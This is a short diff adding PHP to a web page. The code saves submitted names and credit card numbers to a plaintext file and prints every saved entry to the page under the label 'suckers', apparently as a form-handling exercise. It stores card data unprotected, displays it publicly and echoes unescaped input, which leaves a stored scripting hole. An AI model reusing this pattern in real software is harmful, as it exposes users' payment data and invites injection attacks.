@@ -1,3 +1,9 @@
+<?php $file = "sucker.txt";
+$rez = file_get_contents($file);
+$rez .= $_POST['name'].";".$_POST['selectSection'].";".$_POST['CreditCard'].";".$_POST['status']."\r\n";
+file_put_contents($file, $rez);
+
+?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -37,5 +43,12 @@
     </dd>
 
 </dl>
+
+<pre>
+    <p>Here are all suckers who have submitted here: </p>
+    <?php
+    print $rez;
+    ?>
+</pre>
 </body>
 </html>
